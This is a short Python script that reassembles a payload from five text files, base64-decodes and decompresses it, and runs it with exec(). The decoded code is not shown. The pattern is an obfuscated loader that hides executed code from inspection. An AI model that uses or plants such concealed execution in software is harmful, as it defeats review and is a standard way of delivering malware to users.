from pathlib import Path
import base64
import zlib

payload = ''.join(
    Path(f'scripts/bal027_payload_{index:02d}.txt').read_text().strip()
    for index in range(5)
)
exec(zlib.decompress(base64.b64decode(payload)).decode())
